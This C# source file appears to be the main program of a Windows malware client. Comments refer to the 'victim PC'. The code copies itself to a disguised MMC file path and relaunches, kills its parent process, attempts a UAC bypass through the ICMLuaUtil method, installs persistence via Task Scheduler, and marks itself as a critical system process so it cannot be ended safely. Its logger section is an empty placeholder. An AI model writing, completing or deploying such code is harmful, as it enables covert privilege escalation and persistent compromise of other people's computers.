using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client
{
    class Program
    {
        /// <summary>
        /// Main entry point.
        /// </summary>
        static void Main(string[] args)
        {
            ArgsParser(args);
            CheckRealApplication();

            /// Check if Application is already on victim PC.
            if (!Constants.IsInVictimPC()) Migrate();

            /// Attempt to be God.
            if (!Constants.IsAdmin())
                Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
            else
            {
                Armitage.Startup.ViaTaskScheduler();
                ProtectTheLetter();
            }

            /// Start loggers.

            while (true)
            {
                // Sleep
                Thread.Sleep(10000);
            }
        }

        public static void ArgsParser(string[] args)
        {
            try
            {
                if (args.Length > 0)
                {
                    Process.GetProcessById(int.Parse(args[0].Trim())).Kill();
                }
            }
            catch { }
        }

        /// <summary>
        /// Turn into a system process.
        /// </summary>
        public static void ProtectTheLetter()
        {
            Armitage.Critical_Process.Protect();
        }

        public static void Migrate()
        {
            if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
            {
                try
                {
                    if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                        Environment.Exit(0);
                }
                catch { }
            }
        }
        /// <summary>
        /// Checks if a batch file named ll_ exists, if it does, runs it as an executable. The '.exe' extension is not needed.
        /// </summary>
        public static void CheckRealApplication()
        {
            string target = "ll_";
            if (File.Exists(target))
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = target,
                        UseShellExecute = false
                    }
                };
                p.Start();
            }
        }
    }
}
